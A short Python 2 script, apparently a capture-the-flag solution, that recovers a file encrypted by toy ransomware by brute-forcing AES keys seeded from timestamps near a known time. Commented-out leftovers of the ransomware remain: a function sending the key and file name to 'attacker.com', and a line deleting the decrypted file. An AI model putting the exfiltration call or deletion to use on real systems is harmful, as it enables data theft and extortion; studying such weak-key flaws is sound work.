#!/home/pm/anaconda/bin/python
#encoding=utf-8
'''
  _     ____  ______ __   __ _____  _____   ___       _      ___    ____   _  __    _  
 | |   / ___||  __  |\ \ / /|  _  ||_   _| / _ \     | |    / _ \  / ___| | |/ /   | | 
/ __) | |    | |__| | \ . / | |_| |  | |  | | | | __ | |   | | | || |     | ' /   / __)
\__ \ | |    |  _  /   \ /  |  ___|  | |  | | | ||__|| |   | | | || |     | . \   \__ \
(   / | |___ | | \ \   | |  | |      | |  | |_| |    | |__ | |_| || |___  | |\ \  (   /
 |_|   \____||_|  \_\  |_|  |_|      |_|   \___/     |____| \___/  \____| |_| \_\  |_| 
      
'''
from Crypto.Cipher import AES
import random
import time
import os
from docx import Document
import StringIO

plaintext_file = "secret.docx"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size, timestamp):
    key = bytearray()
    random.seed(int(timestamp))
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def pad(text):
    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def encrypt(plaintext, cipher):
    return cipher.encrypt(pad(plaintext)).encode('hex')

def main():
    for i in range(-20000, 20000):
        timestamp = 1523017320 + i
        with open(encrypted_file, 'r') as f:
            ciphertext = f.read()
        ciphertext = ciphertext.decode('hex')
        key = generate_key(32, timestamp)
        # send_key(key.encode('hex'))
        cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
        plaintext = cipher.decrypt(ciphertext)
        
        try: 
            tmp = Document(StringIO.StringIO(plaintext))
            print "Success!"
            with open(plaintext_file, 'w+') as f:
                f.write(plaintext)
            break   
        except: 
            continue

    # 😈
    # os.remove(plaintext_file)

if __name__ == "__main__":
    main()


